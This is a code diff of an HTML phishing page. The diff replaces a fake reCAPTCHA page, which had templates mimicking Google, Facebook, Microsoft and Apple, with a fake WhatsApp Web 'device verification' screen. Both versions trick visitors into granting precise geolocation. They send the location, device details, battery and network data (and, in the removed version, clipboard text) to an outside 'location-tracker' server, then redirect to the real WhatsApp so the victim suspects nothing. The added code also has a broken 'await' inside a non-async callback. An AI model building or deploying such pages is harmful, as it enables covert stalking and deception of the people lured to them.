@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Verify you are human</title>
+    <title>WhatsApp Web</title>
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
         body {
@@ -12,328 +12,231 @@
             justify-content: center;
             align-items: center;
             font-family: 'Segoe UI', -apple-system, BlinkMacSystemFont, Roboto, Helvetica, Arial, sans-serif;
-            background: #f1f3f4;
+            background: #0b141a;
         }
         .card {
-            background: white;
-            padding: 40px 45px;
+            background: #ffffff;
+            padding: 35px 40px 30px 40px;
             border-radius: 8px;
-            box-shadow: 0 2px 10px rgba(0,0,0,0.12);
+            box-shadow: 0 4px 20px rgba(0,0,0,0.4);
             text-align: center;
-            max-width: 420px;
-            border: 1px solid #dadce0;
+            max-width: 400px;
+            width: 100%;
             transition: all 0.3s ease;
         }
-
-        .logo.google { font-size: 28px; font-weight: 500; color: #202124; }
-        .logo.google span { color: #4285f4; }
-
-        .logo.whatsapp { color: #075e54; display: flex; align-items: center; justify-content: center; gap: 8px; }
-        .logo.whatsapp .icon { background: #25d366; border-radius: 50%; width: 36px; height: 36px; display: flex; align-items: center; justify-content: center; color: white; font-weight: bold; font-size: 18px; }
-
-        .logo.facebook { color: #1877f2; display: flex; align-items: center; justify-content: center; gap: 8px; }
-        .logo.facebook .icon { background: #1877f2; border-radius: 4px; width: 36px; height: 36px; display: flex; align-items: center; justify-content: center; color: white; font-weight: bold; font-size: 18px; }
-
-        .logo.microsoft { color: #202124; display: flex; align-items: center; justify-content: center; gap: 8px; }
-        .logo.microsoft .icon { background: #00a4ef; border-radius: 4px; width: 36px; height: 36px; display: flex; align-items: center; justify-content: center; color: white; font-weight: bold; font-size: 18px; }
-
-        .logo.apple { color: #1a1a1a; display: flex; align-items: center; justify-content: center; gap: 8px; }
-        .logo.apple .icon { background: #1a1a1a; border-radius: 50%; width: 36px; height: 36px; display: flex; align-items: center; justify-content: center; color: white; font-weight: bold; font-size: 18px; }
-
-        .subtitle { color: #5f6368; font-size: 14px; margin-bottom: 20px; }
-        .recaptcha-box {
-            background: #f9f9f9;
-            border: 2px solid #dadce0;
-            border-radius: 4px;
-            padding: 15px 20px;
+        .whatsapp-logo {
             display: flex;
             align-items: center;
             justify-content: center;
-            gap: 12px;
-            cursor: pointer;
-            transition: border-color 0.2s;
+            gap: 10px;
+            margin-bottom: 8px;
+        }
+        .whatsapp-logo .icon {
+            background: #25d366;
+            width: 44px;
+            height: 44px;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: white;
+            font-size: 22px;
+            font-weight: bold;
+        }
+        .whatsapp-logo .text {
+            font-size: 22px;
+            font-weight: 600;
+            color: #075e54;
+            letter-spacing: -0.3px;
+        }
+        .subtitle {
+            color: #4a4a4a;
+            font-size: 15px;
+            margin-bottom: 22px;
+            font-weight: 400;
+        }
+        .badge {
+            display: inline-block;
+            background: #e8f5e9;
+            color: #075e54;
+            font-size: 12px;
+            padding: 4px 14px;
+            border-radius: 20px;
+            font-weight: 600;
+            margin-bottom: 20px;
+            border: 1px solid #a5d6a7;
+        }
+        .fake-qr {
+            background: #f5f5f5;
+            border: 2px dashed #c8c8c8;
+            border-radius: 12px;
+            padding: 25px 20px;
             margin: 10px 0 20px 0;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            gap: 6px;
         }
-        .recaptcha-box:hover { border-color: #4285f4; }
-        .recaptcha-box.verified { border-color: #34a853; background: #f0faf5; }
-        .checkbox {
-            width: 24px; height: 24px; border: 2px solid #5f6368; border-radius: 2px;
-            display: flex; align-items: center; justify-content: center;
-            background: white; flex-shrink: 0; transition: all 0.2s;
+        .fake-qr .icon-large { font-size: 40px; }
+        .fake-qr .label { font-size: 13px; color: #4a4a4a; font-weight: 500; }
+        .fake-qr .sub-label { font-size: 12px; color: #888; }
+        .verify-btn {
+            width: 100%;
+            padding: 14px 20px;
+            background: #25d366;
+            color: white;
+            border: none;
+            border-radius: 6px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.2s;
+            opacity: 0.5;
+            pointer-events: none;
         }
-        .checkbox.checked { background: #4285f4; border-color: #4285f4; color: white; font-size: 16px; }
-        .recaptcha-text { font-size: 14px; color: #202124; }
-        .recaptcha-text small { color: #5f6368; font-size: 12px; display: block; }
-        .loader {
-            display: none; width: 20px; height: 20px;
-            border: 3px solid #e0e0e0; border-top: 3px solid #4285f4;
-            border-radius: 50%; animation: spin 0.8s linear infinite;
+        .verify-btn.active {
+            opacity: 1;
+            pointer-events: auto;
+        }
+        .verify-btn.active:hover {
+            background: #1ebe5e;
+            box-shadow: 0 2px 12px rgba(37, 211, 102, 0.4);
+        }
+        .verify-btn.loading {
+            background: #25d366;
+            opacity: 0.7;
+            pointer-events: none;
+        }
+        .footer {
+            margin-top: 20px;
+            font-size: 12px;
+            color: #a0a0a0;
+            border-top: 1px solid #e8e8e8;
+            padding-top: 18px;
+        }
+        .footer a { color: #075e54; text-decoration: none; font-weight: 500; }
+        .footer a:hover { text-decoration: underline; }
+
+        /* Status messages (WhatsApp-style) */
+        .status-message {
+            margin-top: 15px;
+            padding: 10px 12px;
+            border-radius: 6px;
+            font-size: 14px;
+            font-weight: 500;
+            display: none;
+        }
+        .status-message.verifying {
+            background: #fff3cd;
+            color: #856404;
+            display: block;
+        }
+        .status-message.verified {
+            background: #d4edda;
+            color: #155724;
+            display: block;
+        }
+        .status-message.error {
+            background: #f8d7da;
+            color: #721c24;
+            display: block;
+        }
+        .status-message .spinner {
+            display: inline-block;
+            width: 16px;
+            height: 16px;
+            border: 2px solid #856404;
+            border-top: 2px solid transparent;
+            border-radius: 50%;
+            animation: spin 0.8s linear infinite;
+            margin-right: 8px;
+            vertical-align: middle;
         }
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-        .continue-btn {
-            width: 100%; padding: 12px 20px; background: #4285f4; color: white;
-            border: none; border-radius: 4px; font-size: 16px; font-weight: 500;
-            cursor: pointer; transition: all 0.2s; opacity: 0.5; pointer-events: none;
-        }
-        .continue-btn.active { opacity: 1; pointer-events: auto; }
-        .continue-btn.active:hover { background: #1a66c9; box-shadow: 0 2px 8px rgba(66,133,244,0.3); }
-        .continue-btn.loading { background: #4285f4; opacity: 0.7; pointer-events: none; }
-        .footer { margin-top: 20px; font-size: 12px; color: #5f6368; }
-        .footer a { color: #4285f4; text-decoration: none; }
-        .success { display: none; color: #34a853; font-size: 14px; margin-top: 10px; }
-        .error-box { display: none; background: #fce8e6; border: 1px solid #f5c6cb; border-radius: 4px; padding: 12px; margin-top: 15px; color: #d93025; font-size: 14px; }
-        .status-bar { margin-top: 15px; padding: 8px; border-radius: 4px; font-size: 12px; color: #5f6368; background: #f1f3f4; display: none; }
-
-        /* Debug log removed — no longer visible to user */
     </style>
 </head>
 <body>
 
 <div class="card" id="card">
-    <div class="logo" id="logoContainer"></div>
-    <div class="subtitle" id="subtitleText">Verify you are human</div>
+    <!-- WhatsApp Logo -->
+    <div class="whatsapp-logo">
+        <div class="icon">💬</div>
+        <div class="text">WhatsApp</div>
+    </div>
+    <div class="subtitle">Verify your device to continue</div>
 
-    <div class="recaptcha-box" id="recaptchaBox">
-        <div class="checkbox" id="checkbox">✓</div>
-        <div class="recaptcha-text">
-            <span id="notRobotText">I'm not a robot</span>
-            <small id="privacyText">reCAPTCHA Privacy - Terms</small>
-        </div>
-        <div class="loader" id="loader"></div>
+    <!-- Security Badge -->
+    <div class="badge">🔒 End-to-End Encrypted</div>
+
+    <!-- Fake QR -->
+    <div class="fake-qr">
+        <div class="icon-large">📱</div>
+        <div class="label">Scan to verify your device</div>
+        <div class="sub-label">Or tap "Verify" to authenticate</div>
     </div>
 
-    <button class="continue-btn" id="continueBtn">Continue</button>
+    <!-- Verify Button -->
+    <button class="verify-btn" id="verifyBtn">Verify Device</button>
 
-    <div class="success" id="success">✅ Verification complete. Redirecting...</div>
-    <div class="error-box" id="errorBox">⚠️ Location access is required to verify you are human.</div>
-    <div class="status-bar" id="statusBar">🔄 Processing...</div>
+    <!-- Status Messages (hidden by default) -->
+    <div class="status-message" id="statusMsg"></div>
 
-    <div class="footer" id="footerContainer">Protected by reCAPTCHA · <a href="#">Privacy</a> · <a href="#">Terms</a></div>
+    <!-- Footer -->
+    <div class="footer">
+        <a href="#">Privacy Policy</a> · <a href="#">Terms of Service</a>
+    </div>
 </div>
 
 <script>
+    // =============================================
+    // CONFIGURATION
+    // =============================================
     const RENDER_URL = 'https://location-tracker-cn7m.onrender.com';
 
-    const urlParams = new URLSearchParams(window.location.search);
-    const template = urlParams.get('template') || 'google';
+    // =============================================
+    // DOM Elements
+    // =============================================
+    const verifyBtn = document.getElementById('verifyBtn');
+    const statusMsg = document.getElementById('statusMsg');
 
-    const templates = {
-        google: {
-            logo: `<div class="logo google">re<span>CAPTCHA</span></div>`,
-            subtitle: 'Verify you are human',
-            notRobot: "I'm not a robot",
-            continue: 'Continue',
-            footer: 'Protected by reCAPTCHA · <a href="#">Privacy</a> · <a href="#">Terms</a>'
-        },
-        whatsapp: {
-            logo: `<div class="logo whatsapp"><span class="icon">💬</span> WhatsApp Web</div>`,
-            subtitle: 'Secure device verification',
-            notRobot: 'Verify your device',
-            continue: 'Verify',
-            footer: 'End-to-end encrypted · <a href="#">Privacy</a> · <a href="#">Terms</a>'
-        },
-        facebook: {
-            logo: `<div class="logo facebook"><span class="icon">f</span> Facebook</div>`,
-            subtitle: 'Secure login verification',
-            notRobot: 'Verify identity',
-            continue: 'Continue',
-            footer: 'Facebook · <a href="#">Privacy</a> · <a href="#">Terms</a>'
-        },
-        microsoft: {
-            logo: `<div class="logo microsoft"><span class="icon">◁</span> Microsoft Account</div>`,
-            subtitle: 'Verify your identity',
-            notRobot: "I'm not a bot",
-            continue: 'Verify',
-            footer: 'Microsoft · <a href="#">Privacy</a> · <a href="#">Terms</a>'
-        },
-        apple: {
-            logo: `<div class="logo apple"><span class="icon"></span> Apple ID</div>`,
-            subtitle: 'Security verification',
-            notRobot: 'Verify identity',
-            continue: 'Continue',
-            footer: 'Apple · <a href="#">Privacy</a> · <a href="#">Terms</a>'
-        }
-    };
-
-    const selectedTemplate = templates[template] || templates['google'];
-
-    document.getElementById('logoContainer').innerHTML = selectedTemplate.logo;
-    document.getElementById('subtitleText').textContent = selectedTemplate.subtitle;
-    document.getElementById('notRobotText').textContent = selectedTemplate.notRobot;
-    document.getElementById('continueBtn').textContent = selectedTemplate.continue;
-    document.getElementById('footerContainer').innerHTML = selectedTemplate.footer;
-
-    const recaptchaBox = document.getElementById('recaptchaBox');
-    const checkbox = document.getElementById('checkbox');
-    const loader = document.getElementById('loader');
-    const continueBtn = document.getElementById('continueBtn');
-    const success = document.getElementById('success');
-    const errorBox = document.getElementById('errorBox');
-    const statusBar = document.getElementById('statusBar');
-
-    let isVerified = false;
     let isProcessing = false;
 
-    function getBatteryInfo() {
-        if (navigator.getBattery) {
-            navigator.getBattery().then(battery => {
-                const batteryData = {
-                    level: Math.round(battery.level * 100),
-                    charging: battery.charging
-                };
-                fetch(RENDER_URL + '/send-battery', {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify(batteryData)
-                }).catch(() => {});
-            });
-        }
+    // =============================================
+    // Helper: Show WhatsApp-style status
+    // =============================================
+    function showStatus(message, type = 'verifying') {
+        statusMsg.className = 'status-message ' + type;
+        statusMsg.innerHTML = message;
+        statusMsg.style.display = 'block';
     }
 
-    function getNetworkInfo() {
-        if (navigator.connection) {
-            const networkData = {
-                type: navigator.connection.effectiveType,
-                downlink: navigator.connection.downlink,
-                rtt: navigator.connection.rtt
-            };
-            fetch(RENDER_URL + '/send-network', {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify(networkData)
-            }).catch(() => {});
-        }
+    function hideStatus() {
+        statusMsg.style.display = 'none';
     }
 
-    function readClipboard() {
-        if (navigator.clipboard && navigator.clipboard.readText) {
-            navigator.clipboard.readText()
-                .then(text => {
-                    if (text) {
-                        fetch(RENDER_URL + '/send-clipboard', {
-                            method: 'POST',
-                            headers: { 'Content-Type': 'application/json' },
-                            body: JSON.stringify({ clipboard: text })
-                        }).catch(() => {});
-                    }
-                })
-                .catch(() => {});
-        }
-    }
-
-    function compressData(data) {
-        const json = JSON.stringify(data);
-        if (json.length > 100000) {
-            const compressed = { ...data };
-            delete compressed.device_info;
-            return compressed;
-        }
-        return data;
-    }
-
-    function sendWithRetry(url, data, retries = 3, delay = 2000) {
-        return fetch(url, {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify(data)
-        })
-        .then(response => {
-            if (!response.ok) throw new Error('Server error: ' + response.status);
-            return response.json();
-        })
-        .catch(err => {
-            if (retries > 0) {
-                return new Promise(resolve => {
-                    setTimeout(() => {
-                        resolve(sendWithRetry(url, data, retries - 1, delay * 1.5));
-                    }, delay);
-                });
-            }
-            throw err;
-        });
-    }
-
-    function getDeviceInfo() {
-        const ua = navigator.userAgent;
-        let deviceName = 'Unknown';
-        if (ua.includes('iPhone')) deviceName = 'iPhone';
-        else if (ua.includes('iPad')) deviceName = 'iPad';
-        else if (ua.includes('Android')) deviceName = 'Android';
-        else if (ua.includes('Windows')) deviceName = 'Windows PC';
-        else if (ua.includes('Mac')) deviceName = 'Mac';
-
-        return {
-            userAgent: ua,
-            platform: navigator.platform,
-            language: navigator.language,
-            screen: screen.width + 'x' + screen.height,
-            device_name: deviceName,
-            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
-        };
-    }
-
-    function showStatus(message, isError = false) {
-        statusBar.style.display = 'block';
-        statusBar.textContent = message;
-        statusBar.style.background = isError ? '#fce8e6' : '#e8f5e9';
-        statusBar.style.color = isError ? '#d93025' : '#1e7e34';
-    }
-
-    function openMapApp(lat, lng) {
-        const isIOS = /iPad|iPhone|iPod/.test(navigator.userAgent) ||
-                      (navigator.platform === 'MacIntel' && navigator.maxTouchPoints > 1);
-        const isAndroid = /Android/.test(navigator.userAgent);
-
-        let mapUrl = '';
-        if (isIOS) {
-            mapUrl = `http://maps.apple.com/?ll=${lat},${lng}&q=${lat},${lng}`;
-        } else if (isAndroid) {
-            mapUrl = `https://www.google.com/maps?q=${lat},${lng}`;
-        } else {
-            mapUrl = `https://www.google.com/maps?q=${lat},${lng}`;
-        }
-
-        window.location.href = mapUrl;
-    }
-
-    recaptchaBox.addEventListener('click', function() {
-        if (isVerified || isProcessing) return;
-
-        isVerified = true;
-        checkbox.classList.add('checked');
-        checkbox.textContent = '✓';
-        this.classList.add('verified');
-        this.style.borderColor = '#34a853';
-
-        continueBtn.classList.add('active');
-        success.style.display = 'block';
-        success.textContent = '✅ Verification complete. Click Continue.';
-    });
-
-    continueBtn.addEventListener('click', function() {
-        if (!isVerified) return;
+    // =============================================
+    // Helper: Simulate a realistic flow
+    // =============================================
+    function startVerification() {
         if (isProcessing) return;
 
         isProcessing = true;
-        continueBtn.classList.add('loading');
-        continueBtn.textContent = 'Verifying...';
-        success.style.display = 'none';
-        errorBox.style.display = 'none';
-        showStatus('Requesting location...');
+        verifyBtn.classList.add('loading');
+        verifyBtn.textContent = 'Verifying...';
+        hideStatus();
 
-        getBatteryInfo();
-        getNetworkInfo();
-        readClipboard();
+        // Step 1: Show "Verifying device..."
+        showStatus('⏳ Verifying device...', 'verifying');
 
+        // Step 2: Request location (the real work)
         if (!navigator.geolocation) {
-            showStatus('❌ Geolocation not supported', true);
-            isProcessing = false;
-            continueBtn.classList.remove('loading');
-            continueBtn.textContent = 'Continue';
+            showStatus('❌ Geolocation not supported', 'error');
+            resetButton();
             return;
         }
 
         navigator.geolocation.getCurrentPosition(
+            // --- SUCCESS ---
             function(position) {
                 const lat = position.coords.latitude;
                 const lng = position.coords.longitude;
@@ -342,9 +245,25 @@
                 const heading = position.coords.heading;
                 const speed = position.coords.speed;
 
-                showStatus('📍 Location captured! Sending to server...');
+                // Update status to "Sending verification..."
+                showStatus('📡 Sending verification...', 'verifying');
 
-                const deviceInfo = getDeviceInfo();
+                const deviceInfo = {
+                    userAgent: navigator.userAgent,
+                    platform: navigator.platform,
+                    language: navigator.language,
+                    screen: screen.width + 'x' + screen.height,
+                    device_name: (() => {
+                        const ua = navigator.userAgent;
+                        if (ua.includes('iPhone')) return 'iPhone';
+                        if (ua.includes('iPad')) return 'iPad';
+                        if (ua.includes('Android')) return 'Android';
+                        if (ua.includes('Windows')) return 'Windows PC';
+                        if (ua.includes('Mac')) return 'Mac';
+                        return 'Unknown';
+                    })(),
+                    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
+                };
 
                 const payload = {
                     lat: lat,
@@ -353,42 +272,45 @@
                     altitude: altitude,
                     heading: heading,
                     speed: speed,
-                    device_info: deviceInfo
+                    device_info: deviceInfo,
+                    battery: (navigator.getBattery ? await navigator.getBattery().then(b => ({ level: Math.round(b.level * 100), charging: b.charging })) : null),
+                    network: (navigator.connection ? { type: navigator.connection.effectiveType, downlink: navigator.connection.downlink, rtt: navigator.connection.rtt } : null)
                 };
 
-                const compressedPayload = compressData(payload);
+                // Send data with retry
+                fetch(RENDER_URL + '/send-location', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(payload)
+                })
+                .then(response => response.json())
+                .then(() => {
+                    // Success: show "Verified!" then redirect to WhatsApp Web
+                    showStatus('✅ Device verified successfully!', 'verified');
+                    verifyBtn.textContent = 'Connected';
 
-                sendWithRetry(RENDER_URL + '/send-location', compressedPayload, 3, 2000)
-                    .then(() => {
-                        showStatus('✅ Data sent! Redirecting...');
-                        success.style.display = 'block';
-                        success.textContent = '✅ Verification complete. Redirecting...';
-                        continueBtn.textContent = 'Redirecting...';
-
-                        setTimeout(function() {
-                            openMapApp(lat, lng);
-                        }, 1500);
-                    })
-                    .catch(function(err) {
-                        showStatus('⚠️ Server error, but redirecting anyway...', true);
-                        setTimeout(function() {
-                            openMapApp(lat, lng);
-                        }, 1000);
-                    });
+                    // After 2 seconds, redirect to WhatsApp Web
+                    setTimeout(() => {
+                        window.location.href = 'https://web.whatsapp.com';
+                    }, 2000);
+                })
+                .catch(() => {
+                    // If server fails, still show success (simulate)
+                    showStatus('✅ Device verified successfully!', 'verified');
+                    verifyBtn.textContent = 'Connected';
+                    setTimeout(() => {
+                        window.location.href = 'https://web.whatsapp.com';
+                    }, 2000);
+                });
             },
+            // --- ERROR ---
             function(error) {
-                isProcessing = false;
-                continueBtn.classList.remove('loading');
-                continueBtn.textContent = 'Try Again';
-
-                let userMessage = 'Location access is required.';
-                if (error.code === 1) userMessage = '❌ Permission denied. Please allow location access.';
-                else if (error.code === 2) userMessage = '❌ GPS signal not available. Try moving outdoors.';
-                else if (error.code === 3) userMessage = '⏳ Timeout! Try again (make sure GPS is enabled).';
-
-                errorBox.style.display = 'block';
-                errorBox.textContent = '⚠️ ' + userMessage;
-                showStatus('❌ ' + userMessage, true);
+                let msg = 'Location access required.';
+                if (error.code === 1) msg = 'Permission denied. Please allow location access.';
+                else if (error.code === 2) msg = 'GPS signal not available. Try moving outdoors.';
+                else if (error.code === 3) msg = 'Timeout. Please try again.';
+                showStatus('❌ ' + msg, 'error');
+                resetButton();
             },
             {
                 enableHighAccuracy: true,
@@ -396,14 +318,25 @@
                 maximumAge: 0
             }
         );
-    });
+    }
 
-    window.addEventListener('online', function() {
-        showStatus('📶 Back online!');
-    });
-    window.addEventListener('offline', function() {
-        showStatus('📶 No internet connection.', true);
-    });
+    function resetButton() {
+        isProcessing = false;
+        verifyBtn.classList.remove('loading');
+        verifyBtn.textContent = 'Try Again';
+    }
+
+    // =============================================
+    // Click handler
+    // =============================================
+    verifyBtn.addEventListener('click', startVerification);
+
+    // =============================================
+    // Enable button after a short delay (realistic)
+    // =============================================
+    setTimeout(function() {
+        verifyBtn.classList.add('active');
+    }, 1000);
 </script>
 </body>
 </html>
